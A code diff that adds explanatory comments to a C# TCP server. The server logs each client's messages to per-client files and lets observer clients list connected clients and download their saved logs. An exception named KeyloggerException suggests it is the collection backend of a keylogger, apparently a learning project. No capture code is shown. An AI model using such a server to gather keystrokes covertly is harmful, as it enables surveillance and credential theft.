@@ -180,6 +180,7 @@ namespace ServerCore
         {
             var stream = handler.Stream;
             var buffer = new byte[1024];
+
             string safeFileName = handler.Id.Replace(":", "_");
             string filePath = Path.Combine("SaveData", safeFileName + ".txt");
 
@@ -188,17 +189,22 @@ namespace ServerCore
             try
             {
                 writer = new StreamWriter(filePath, append: true);
+
                 while (_running && handler.TcpClient.Connected)
                 {
                     int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
+
+                    // 0 indicates the client disconnected
                     if (bytesRead == 0) break;
 
                     string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                     Console.WriteLine($"[{handler.Id}] {message}");
 
+                    // Write the message to file
                     await writer.WriteAsync(message);
-                    await writer.FlushAsync();
+                    await writer.FlushAsync(); // Ensure it's saved immediately
 
+                    // notify all observers about this message
                     Notify("[" + handler.Id + "]" + message);
                 }
             }
@@ -213,10 +219,14 @@ namespace ServerCore
                     writer.Dispose();
 
                 Console.WriteLine($"Client disconnected: {handler.Id}");
+
                 handler.TcpClient.Close();
+
+                // remove the client from the list safely
                 lock (_lock) _clients.Remove(handler);
             }
         }
+
 
         /// <summary>
         /// Keeps an observer client connected and handles special commands like "list" or "getfile".
@@ -233,8 +243,10 @@ namespace ServerCore
 
                 while (_running && client.TcpClient.Connected)
                 {
+                    // check if any data is available to read
                     if (stream.DataAvailable)
                     {
+                        // read the incoming data from the observer
                         int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                         if (bytesRead == 0)
                             break;
@@ -242,6 +254,7 @@ namespace ServerCore
                         string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                         Console.WriteLine("[Observer " + client.Id + "] Command: " + command);
 
+                        // list: return a list of connected standard clients
                         if (command.Equals("list", StringComparison.OrdinalIgnoreCase))
                         {
                             string response;
@@ -251,9 +264,11 @@ namespace ServerCore
                                 response = "[LIST]" + string.Join("\n", ids);
                             }
 
+                            // send the list of client IDs back to the observer
                             byte[] responseData = Encoding.UTF8.GetBytes(response + "\n");
                             await stream.WriteAsync(responseData, 0, responseData.Length);
                         }
+                        // getfile: return the saved file content for that client
                         else if (command.StartsWith("getfile", StringComparison.OrdinalIgnoreCase))
                         {
                             string clientId = command.Substring("getfile".Length).Trim();
@@ -264,17 +279,21 @@ namespace ServerCore
                             {
                                 if (File.Exists(filePath))
                                 {
+                                    // read the file content (even if file is being written to)
                                     string fileContent;
                                     using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                     using (var sr = new StreamReader(fs))
                                     {
                                         fileContent = await sr.ReadToEndAsync();
                                     }
+
+                                    // send the file content to the observer
                                     byte[] response = Encoding.UTF8.GetBytes("[FILE]" + fileContent);
                                     await stream.WriteAsync(response, 0, response.Length);
                                 }
                                 else
                                 {
+                                    // notify observer that the file was not found
                                     string errorMsg = "[ERROR]File not found";
                                     byte[] response = Encoding.UTF8.GetBytes(errorMsg);
                                     await stream.WriteAsync(response, 0, response.Length);
@@ -282,6 +301,7 @@ namespace ServerCore
                             }
                             catch (Exception ex)
                             {
+                                // wrap and log any error related to reading or sending the file
                                 var kex = new KeyloggerException("Error reading or sending file", ex);
                                 Console.WriteLine(kex);
                             }
@@ -298,11 +318,13 @@ namespace ServerCore
             }
             finally
             {
+                // clean up observer client on disconnect or error
                 Console.WriteLine("Observer disconnected: " + observer.Id);
                 lock (_lock) _observers.Remove(observer);
                 (observer as ObserverClient)?.Close();
             }
         }
+
 
         /// <summary>
         /// Attaches an observer to the notification list.
